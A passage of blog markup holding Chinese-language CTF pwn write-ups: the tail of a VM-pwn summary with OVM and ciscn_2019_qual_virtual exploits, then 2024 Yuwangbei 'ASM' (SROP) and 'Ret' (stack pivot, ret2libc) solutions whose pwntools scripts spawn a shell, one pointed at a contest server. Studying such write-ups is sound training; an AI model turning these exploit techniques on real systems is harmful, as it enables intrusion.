class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gt <span class="hljs-keyword">import</span> *<br>con(<span class="hljs-string">&quot;amd64&quot;</span>)<br><br>io = process(<span class="hljs-string">&quot;./OVM&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/su/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">v4,v3,v2</span>):<br>    opcode = u32((p8(<span class="hljs-number">0x70</span>)+p8(v4)+p8(v3)+p8(v2))[::-<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">return</span> opcode<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">xor</span>(<span class="hljs-params">v4,v3,v2</span>):<br>    opcode = u32((p8(<span class="hljs-number">0xb0</span>)+p8(v4)+p8(v3)+p8(v2))[::-<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">return</span> opcode<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rhl</span>(<span class="hljs-params">v4,v3,v2</span>):<br>    opcode = u32((p8(<span class="hljs-number">0xd0</span>)+p8(v4)+p8(v3)+p8(v2))[::-<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">return</span> opcode<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">lhl</span>(<span class="hljs-params">v4,v3,v2</span>):<br>    opcode = u32((p8(<span class="hljs-number">0xc0</span>)+p8(v4)+p8(v3)+p8(v2))[::-<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">return</span> opcode<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">readn</span>(<span class="hljs-params">v4,v2</span>):<br>    opcode = u32((p8(<span class="hljs-number">0x30</span>)+p8(v4)+p8(<span class="hljs-number">0</span>)+p8(v2))[::-<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">return</span> opcode<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">writen</span>(<span class="hljs-params">v4,v2</span>):<br>    opcode = u32((p8(<span class="hljs-number">0x40</span>)+p8(v4)+p8(<span class="hljs-number">0</span>)+p8(v2))[::-<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">return</span> opcode<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">setnum</span>(<span class="hljs-params">v4,v2</span>):<br>    opcode = u32((p8(<span class="hljs-number">0x10</span>)+p8(v4)+p8(<span class="hljs-number">0</span>)+p8(v2))[::-<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">return</span> opcode<br><br><span class="hljs-comment">#n=(0x202060-0x201f80)/4 = 56</span><br><span class="hljs-comment">#-56 = 0xffffffc8</span><br><span class="hljs-comment">#-8</span><br><span class="hljs-comment">#stdin -&gt; __free_hook = 0x2398</span><br>code =[<br>    setnum(<span class="hljs-number">0</span>,<span class="hljs-number">8</span>),<span class="hljs-comment"># reg[0]=8</span><br>    setnum(<span class="hljs-number">1</span>,<span class="hljs-number">0xff</span>), <span class="hljs-comment">#reg[1]=0xff</span><br>    setnum(<span class="hljs-number">2</span>,<span class="hljs-number">0xff</span>), <span class="hljs-comment">#reg[2]=0xff</span><br>    lhl(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>), <span class="hljs-comment">#reg[2] = reg[2]&lt;&lt;reg[0] = 0xff &lt;&lt; 0x8 =0xff00</span><br>    add(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>), <span class="hljs-comment">#reg[2] = reg[2] + reg[1] = 0xff00 + 0xff = 0xffff</span><br>    lhl(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>), <span class="hljs-comment">#reg[2] = reg[2]&lt;&lt;reg[0] = 0xffff &lt;&lt; 0x8 = 0xffff00</span><br>    add(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>), <span class="hljs-comment">#reg[2] = reg[2] + reg[1] = 0xffff00 + 0xff = 0xffffff</span><br>    lhl(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>), <span class="hljs-comment">#reg[2] = reg[2]&lt;&lt;reg[0] = 0xffffff &lt;&lt; 0x8 = 0xffffff00</span><br>    setnum(<span class="hljs-number">1</span>,<span class="hljs-number">0xc8</span>), <span class="hljs-comment">#reg[3] = 0xc8</span><br>    add(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>), <span class="hljs-comment">#reg[2] = reg[2] = reg[2]+reg[1] = 0xffffff00 + 0xc8 = 0xffffffc8 = -56</span><br>    readn(<span class="hljs-number">3</span>,<span class="hljs-number">2</span>), <span class="hljs-comment">#reg[3] = memory[reg[2]] stdin</span><br>    setnum(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>), <span class="hljs-comment">#reg[1] = 1</span><br>    add(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>), <span class="hljs-comment">#reg[2] = reg[2] + reg[1] = -55</span><br>    readn(<span class="hljs-number">4</span>,<span class="hljs-number">2</span>), <span class="hljs-comment">#reg[4] = memory[reg[2]] stdin+4</span><br>    setnum(<span class="hljs-number">1</span>,<span class="hljs-number">0x10</span>),<br>    lhl(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>), <span class="hljs-comment">#reg[1] = reg[1]&lt;&lt;reg[0] = 0x10 &lt;&lt; 8= 0x1000</span><br>    setnum(<span class="hljs-number">5</span>,<span class="hljs-number">0x90</span>),<br>    setnum(<span class="hljs-number">6</span>,<span class="hljs-number">0x3</span>),<br>    add(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-comment">#reg[1] = reg[1] + reg[1] = 0x1000 + 0x1000 = 0x2000</span><br>    lhl(<span class="hljs-number">6</span>,<span class="hljs-number">6</span>,<span class="hljs-number">0</span>), <span class="hljs-comment">#reg[6] = reg[6]&lt;&lt;reg[0] = 0x3&lt;&lt;8 = 0x300</span><br>    add(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">6</span>), <span class="hljs-comment">#reg[1] = reg[1] + reg[6] = 0x2000+0x300= 0x2300</span><br>    add(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">5</span>), <span class="hljs-comment">#reg[1] = reg[1] + reg[5] = 0x2300 + 0x90 = 0x2390</span><br>    add(<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>), <span class="hljs-comment">#reg[3] = reg[3] + reg[1] = __free_hook-8</span><br>    setnum(<span class="hljs-number">5</span>,<span class="hljs-number">47</span>),<br>    add(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">5</span>), <span class="hljs-comment">#reg[2] = reg[2] + reg[5] = -55+47 = -8</span><br>    writen(<span class="hljs-number">3</span>,<span class="hljs-number">2</span>), <span class="hljs-comment">#memory[reg[2]] = reg[3] = memory[-8] = reg[3]</span><br>    setnum(<span class="hljs-number">5</span>,<span class="hljs-number">1</span>),<br>    add(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">5</span>), <span class="hljs-comment">#reg[2] = reg[2] + reg[1] = -8 +1 = -7</span><br>    writen(<span class="hljs-number">4</span>,<span class="hljs-number">2</span>) <span class="hljs-comment">#memory[reg[2]] = reg[4] = memory[-7] = reg[4]  </span><br><br>]<br><br>io.recvuntil(<span class="hljs-string">&quot;PC: &quot;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0</span>))<br>io.recvuntil(<span class="hljs-string">&quot;SP: &quot;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>io.recvuntil(<span class="hljs-string">&quot;CODE SIZE: &quot;</span>)<br><br>io.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(code)))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> code:<br>   io.sendline(<span class="hljs-built_in">str</span>(i))<br><br><br>io.recvuntil(<span class="hljs-string">&quot;3: &quot;</span>)<br>last_4bytes = <span class="hljs-built_in">int</span>(io.recv(<span class="hljs-number">8</span>),<span class="hljs-number">16</span>)<br>suc(<span class="hljs-string">&quot;last_4bytes&quot;</span>,last_4bytes)<br>io.recvuntil(<span class="hljs-string">&quot;4: &quot;</span>)<br>high_4bytes = <span class="hljs-built_in">int</span>(io.recv(<span class="hljs-number">4</span>),<span class="hljs-number">16</span>)<br>suc(<span class="hljs-string">&quot;high_4bytes&quot;</span>,high_4bytes)<br><br>libc_base = ((high_4bytes &lt;&lt; <span class="hljs-number">32</span>) + last_4bytes) - libc.sym[<span class="hljs-string">&quot;__free_hook&quot;</span>] + <span class="hljs-number">8</span><br>suc(<span class="hljs-string">&quot;libc_base&quot;</span>,libc_base)<br>system = libc_base + libc.sym[<span class="hljs-string">&quot;system&quot;</span>]<br>io.recvuntil(<span class="hljs-string">&quot; OVM?\n&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span> + p64(system)<br><span class="hljs-comment">#gdb.attach(io)</span><br>io.send(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="ciscn-2019-qual-virtual"><a href="#ciscn-2019-qual-virtual" class="headerlink" title="ciscn_2019_qual_virtual"></a>ciscn_2019_qual_virtual</h2><p>保护策略</p><p><img src="/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241212230907806-826221916.png" alt="img"></p><p>ida逆向分析</p><p><img src="/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241212230837520-618409823.png" alt="img"></p><p>这里仍然还是申请空间给stack，text，data等等</p><p><img src="/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241212231207168-659364568.png" alt="img"></p><p>这里通过相关命令来转换对应字节</p><p><img src="/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241212231657814-824395369.png" alt="img"></p><p>这里将对应的代码放入text段</p><p>之后进入相应的功能</p><p><img src="/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241212232226004-739893075.png" alt="img"></p><p>接受三个参数，a1为text段结构体的指针，a2为stack段结构体的指针，a3为data段结构体的指针</p><p>这里看一下push函数</p><p><img src="/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241213154412467-223727277.png" alt="img"></p><p>这里a1,a2就是原先的a3，a2</p><p><img src="/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241213154536714-1643444929.png" alt="img"></p><p>8字节一组的opcode，倒着拿取</p><p><img src="/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241213154646693-2054037180.png" alt="img"></p><p>那么push功能就是到data段上拿取一个值给v3然后将v3给stack</p><p>pop即是和它相反的操作</p><p>重点看看load和save</p><p><img src="/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241213160329097-963325194.png" alt="img"></p><p>只接受一个参数也就是a3,data结构体，也就是说把data的东西加上v2偏移继续放入data，当然v2的值也是data里面取到的</p><p><img src="/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241213160627536-2044709315.png" alt="img"></p><p>当然save就是相反的操作，将data里面值放入v3，而这里的v2依然可以控制</p><p>这题没有开启got表全保护，那么可以修改puts的got表为system，那么在后面打印name的时候就会system(“&#x2F;bin&#x2F;sh”)获取shell</p><p>控制v2的值实现负数索引，那么现在有个问题，因为stack指针存放在堆块里面，所以要想实现负数索引获取libc地址的话需要先把指针进行修改</p><p><img src="/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241213161433224-83474805.png" alt="img"></p><p>这里取的地址是下图这个，还有一个要注意，就是存储stack是逆序存储的</p><p><img src="/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241213162038357-1490745944.png" alt="img"></p><p>这里0xfffff….的值是-3，那么接下来的save就会取这两个值，而-3是下标就会把data指针修改成0x4040d0</p><p>这里是把stack的两个值取到了data中，然后save修改data指针</p><p><img src="/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241213163226582-874674569.png" alt="img"></p><p>这里取的是stderr和system的偏移</p><p><img src="/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241213163821570-2125481947.png" alt="img"></p><p>stderr在新的指针下标是-1，那么取-1放入data，然后load进入data</p><p><img src="/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241213164717866-432455765.png" alt="img"></p><p><img src="/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241213164536776-2043531085.png" alt="img"></p><p>继续取一个偏移</p><p><img src="/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241213164659199-432134688.png" alt="img"></p><p>add放入data</p><p><img src="/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241213164816886-1092033078.png" alt="img"></p><p>然后最后push进行到putsgot表的偏移，然后save即可修改puts 的got表</p><p><img src="/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241213165010512-1055607648.png" alt="img"></p><p>最后即可getshell</p><h2 id="EXP：-1"><a href="#EXP：-1" class="headerlink" title="EXP："></a>EXP：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gt <span class="hljs-keyword">import</span> *<br>con(<span class="hljs-string">&quot;amd64&quot;</span>)<br>libc= ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br>io = process(<span class="hljs-string">&quot;./ciscn_2019_qual_virtual&quot;</span>)<br>io.recvuntil(<span class="hljs-string">&quot;name:&quot;</span>)<br><br>io.sendline(<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<br><span class="hljs-comment"># gdb.attach(io)</span><br>io.recvuntil(<span class="hljs-string">&quot;instruction:&quot;</span>)    <br>offest = libc.sym[<span class="hljs-string">&quot;system&quot;</span>] - libc.sym[<span class="hljs-string">&quot;_IO_2_1_stderr_&quot;</span>]<br>payload = <span class="hljs-string">&#x27;push push save push load push add push save&#x27;</span><br>io.sendline(payload)<br><br>io.recvuntil(<span class="hljs-string">&quot;data:&quot;</span>)<br><br>data = [<span class="hljs-number">0x4040d0</span>,-<span class="hljs-number">3</span>,-<span class="hljs-number">1</span>,offest,-<span class="hljs-number">21</span>] <br>payload = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data:<br>    payload+= <span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&#x27; &#x27;</span><br>gdb.attach(io)<br>io.sendline(payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>vmpwn的学习远远不止这些，这里只能算入门，大致了解一下vmpwn的分析方法和一些常见漏洞等等，对于这些偏逆向的题目需要有一定的逆向基础，对我而言还是比较吃力的，看懂要很久，但是我建议加上动态调试多去看看其中的变化，还是便于理解的…..vmpwn先搁了</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.anquanke.com/post/id/208450#h2-0">VM Pwn学习-安全客 - 安全资讯平台</a></p><p><a href="https://zikh26.github.io/posts/ccd7886.html#push%E5%87%BD%E6%95%B0">关于vm pwn的学习总结 | ZIKH26’s Blog</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>PWN</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024御网杯线上Pwn方向题解</title>
    <link href="/2024/11/01/2024%E5%BE%A1%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8APwn%E6%96%B9%E5%90%91%E9%A2%98%E8%A7%A3/"/>
    <url>/2024/11/01/2024%E5%BE%A1%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8APwn%E6%96%B9%E5%90%91%E9%A2%98%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h3 id="ASM"><a href="#ASM" class="headerlink" title="ASM"></a>ASM</h3><p><strong>Checksec检查保护</strong></p><p><strong><img src="/2024/11/01/2024%E5%BE%A1%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8APwn%E6%96%B9%E5%90%91%E9%A2%98%E8%A7%A3/3419447-20241101211058987-2134502204.png" alt="img"></strong></p><p><strong>基本上保护都关闭了</strong></p><p><strong>64位ida逆向</strong></p><p><strong><img src="/2024/11/01/2024%E5%BE%A1%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8APwn%E6%96%B9%E5%90%91%E9%A2%98%E8%A7%A3/3419447-20241101211113324-383483724.png" alt="img"></strong></p><p><strong>程序只有一段，并且返回地址就是输入的数据，看起来就是srop了，找一下可以用的gadget</strong></p><p><img src="/2024/11/01/2024%E5%BE%A1%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8APwn%E6%96%B9%E5%90%91%E9%A2%98%E8%A7%A3/3419447-20241101211142484-110909446.png" alt="img"></p><p><strong>通过异或清空rax值，然后通过异或ecx和1，异或rax和rcx即可增加rax的值，同理左移一位同样可以增加rax的值，将rax增加到0xf然后打srop，程序还给出了&#x2F;bin&#x2F;sh</strong></p><p><strong>EXP:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">1.</span><span class="hljs-keyword">from</span> gt <span class="hljs-keyword">import</span> *<br><span class="hljs-number">2.</span><br><span class="hljs-number">3.</span>con(<span class="hljs-string">&quot;amd64&quot;</span>)<br><span class="hljs-number">4.</span><br><span class="hljs-number">5.</span><span class="hljs-comment">#io = process(&quot;./asm&quot;)</span><br><span class="hljs-number">6.</span>io = remote(<span class="hljs-string">&#x27;101.200.58.4&#x27;</span>,<span class="hljs-number">10001</span>)<br><span class="hljs-number">7.</span><span class="hljs-comment">#gdb.attach(io)</span><br><span class="hljs-number">8.</span><span class="hljs-comment">#pause()</span><br><span class="hljs-number">9.</span>sh = <span class="hljs-number">0x40200A</span><br><span class="hljs-number">10.</span>syscall = <span class="hljs-number">0x40102D</span><br><span class="hljs-number">11.</span>xor_rax = <span class="hljs-number">0x000000000040103D</span>  <span class="hljs-comment">#xor     rax, rax</span><br><span class="hljs-number">12.</span>shl_rax = <span class="hljs-number">0x0000000000401030</span>  <span class="hljs-comment">#shl     rax, 1</span><br><span class="hljs-number">13.</span>mov_ecx  = <span class="hljs-number">0x0000000000401034</span> <span class="hljs-comment">#: mov ecx, 1 ; xor rax, rcx ; ret</span><br><span class="hljs-number">14.</span>elf = ELF(<span class="hljs-string">&#x27;./asm&#x27;</span>)<br><span class="hljs-number">15.</span>system =SigreturnFrame()<br><span class="hljs-number">16.</span>system.rax=<span class="hljs-number">0x3b</span><br><span class="hljs-number">17.</span>system.rdi=sh<br><span class="hljs-number">18.</span>system.rsi=<span class="hljs-number">0x0</span><br><span class="hljs-number">19.</span>system.rdx=<span class="hljs-number">0x0</span><br><span class="hljs-number">20.</span>system.rip=syscall<br><span class="hljs-number">21.</span>payload =p64(xor_rax)+ p64(mov_ecx)+p64(shl_rax)+ p64(mov_ecx)+p64(shl_rax)+ p64(mov_ecx)+p64(shl_rax)+ p64(mov_ecx)<br><span class="hljs-number">22.</span>payload +=p64(syscall)+flat(system)<br><span class="hljs-number">23.</span><span class="hljs-comment">#gdb.attach(io)</span><br><span class="hljs-number">24.</span>io.sendline(payload)<br><span class="hljs-number">25.</span>io.interactive()<br></code></pre></td></tr></table></figure><p><img src="/2024/11/01/2024%E5%BE%A1%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8APwn%E6%96%B9%E5%90%91%E9%A2%98%E8%A7%A3/3419447-20241101211221359-688324889.png" alt="img"> </p><h3 id="Ret"><a href="#Ret" class="headerlink" title="Ret"></a>Ret</h3><p><strong>C****hecksec 检查保护</strong></p><p><strong><img src="/2024/11/01/2024%E5%BE%A1%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8APwn%E6%96%B9%E5%90%91%E9%A2%98%E8%A7%A3/3419447-20241101211239242-425301550.png" alt="img"></strong></p><p><strong>基本上也是啥都没有开</strong></p><p><strong>那么直接64位ida逆向</strong></p><p><strong><img src="/2024/11/01/2024%E5%BE%A1%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8APwn%E6%96%B9%E5%90%91%E9%A2%98%E8%A7%A3/3419447-20241101211257764-1979236058.png" alt="img"></strong></p><p><strong>程序主要是播散时间种子，然后随机数取值在0-160之间，当大于等于144时候才会溢出到返回地址，因此进行栈迁移，同样控制了rbp就可以控制rdx</strong></p><p><strong><img src="/2024/11/01/2024%E5%BE%A1%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8APwn%E6%96%B9%E5%90%91%E9%A2%98%E8%A7%A3/3419447-20241101211310885-1418668820.png" alt="img"></strong></p><p><strong>那样就可以一直溢出了，然后打ret2libc，当然随机数需要一点运气</strong></p><p><strong>EXP：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">1.</span><span class="hljs-keyword">from</span> gt <span class="hljs-keyword">import</span> *<br><span class="hljs-number">2.</span><br><span class="hljs-number">3.</span>con(<span class="hljs-string">&quot;amd64&quot;</span>)<br><span class="hljs-number">4.</span><br><span class="hljs-number">5.</span><span class="hljs-comment">#io = process(&quot;./ret&quot;)</span><br><span class="hljs-number">6.</span>io = remote(<span class="hljs-string">&quot;101.200.58.4&quot;</span>,<span class="hljs-number">10004</span>)<br><span class="hljs-number">7.</span>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br><span class="hljs-number">8.</span><span class="hljs-comment">#gdb.attach(io)</span><br><span class="hljs-number">9.</span><br><span class="hljs-number">10.</span><br><span class="hljs-number">11.</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br><span class="hljs-number">12.</span>    io.sendafter(<span class="hljs-string">&quot;ask?&quot;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>)<br><span class="hljs-number">13.</span><br><span class="hljs-number">14.</span>    <span class="hljs-comment">#gdb.attach(io)</span><br><span class="hljs-number">15.</span>    io.recvuntil(<span class="hljs-string">&quot;ok,&quot;</span>)<br><span class="hljs-number">16.</span>    num = <span class="hljs-built_in">int</span>(io.recv(<span class="hljs-number">3</span>),<span class="hljs-number">10</span>)<br><span class="hljs-number">17.</span>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;---------------------------&quot;</span>,num)<br><span class="hljs-number">18.</span>    <span class="hljs-keyword">if</span> num &lt;<span class="hljs-number">144</span>:<br><span class="hljs-number">19.</span>        <span class="hljs-keyword">return</span><br><span class="hljs-number">20.</span>    io.recvuntil(<span class="hljs-string">&quot;number\n&quot;</span>)<br><span class="hljs-number">21.</span>    <span class="hljs-comment">#num = io.recv(3)</span><br><span class="hljs-number">22.</span>    <span class="hljs-comment">#print(num)</span><br><span class="hljs-number">23.</span>    bss = <span class="hljs-number">0x601280</span> + <span class="hljs-number">0x300</span> <br><span class="hljs-number">24.</span>    lv = <span class="hljs-number">0x400891</span><br><span class="hljs-number">25.</span>    read = <span class="hljs-number">0x400876</span><br><span class="hljs-number">26.</span>    pop_rdi = <span class="hljs-number">0x0000000000400923</span><span class="hljs-comment">#: pop rdi; ret;</span><br><span class="hljs-number">27.</span>    puts_got = <span class="hljs-number">0x601018</span><br><span class="hljs-number">28.</span>    puts_plt = <span class="hljs-number">0x400600</span><br><span class="hljs-number">29.</span>    payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x80</span> + p64(bss) + p64(read)<br><span class="hljs-number">30.</span>    <span class="hljs-comment">#sleep(1)</span><br><span class="hljs-number">31.</span>    <span class="hljs-comment">#gdb.attach(io)</span><br><span class="hljs-number">32.</span>    io.send(payload)<br><span class="hljs-number">33.</span><br><span class="hljs-number">34.</span><br><span class="hljs-number">35.</span>pwn()<br><span class="hljs-number">36.</span>pop_rdi = <span class="hljs-number">0x0000000000400923</span><span class="hljs-comment">#: pop rdi; ret;</span><br><span class="hljs-number">37.</span>puts_got = <span class="hljs-number">0x601018</span><br><span class="hljs-number">38.</span>puts_plt = <span class="hljs-number">0x400600</span><br><span class="hljs-number">39.</span>bss = <span class="hljs-number">0x601280</span> + <span class="hljs-number">0x300</span> <br><span class="hljs-number">40.</span>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x80</span> +p64(bss+<span class="hljs-number">4</span>) + p64(<span class="hljs-number">0x400873</span>)<span class="hljs-comment">#p64(pop_rdi) + p64(puts_got) + p64(puts_plt) #+ p64()</span><br><span class="hljs-number">41.</span>io.send(payload)<br><span class="hljs-number">42.</span>ret = <span class="hljs-number">0x6012a8</span><br><span class="hljs-number">43.</span>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x84</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(<span class="hljs-number">0x400876</span>)<br><span class="hljs-number">44.</span>io.send(payload)<br><span class="hljs-number">45.</span>libc_base = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="hljs-string">&quot;puts&quot;</span>]<br><span class="hljs-number">46.</span>suc(<span class="hljs-string">&quot;libc_base&quot;</span>,libc_base)<br><span class="hljs-number">47.</span>pop_rsi = <span class="hljs-number">0x0000000000400921</span><span class="hljs-comment">#: pop rsi; pop r15; ret; </span><br><span class="hljs-number">48.</span>system = libc_base + libc.sym[<span class="hljs-string">&quot;system&quot;</span>]<br><span class="hljs-number">49.</span>binsh = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">&quot;/bin/sh&quot;</span>))<br><span class="hljs-number">50.</span>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0xa4</span>-<span class="hljs-number">8</span>) + p64(pop_rdi+<span class="hljs-number">1</span>)+p64(pop_rdi) + p64(binsh) + p64(pop_rsi)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+ p64(system)<br><span class="hljs-number">51.</span><br><span class="hljs-number">52.</span>io.send(payload)<br><span class="hljs-number">53.</span>io.interactive()<br></code></pre></td></tr></table></figure><p><img src="/2024/11/01/2024%E5%BE%A1%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8APwn%E6%96%B9%E5%90%91%E9%A2%98%E8%A7%A3/3419447-20241101211401872-1062893900.png" alt="img"></p><h3 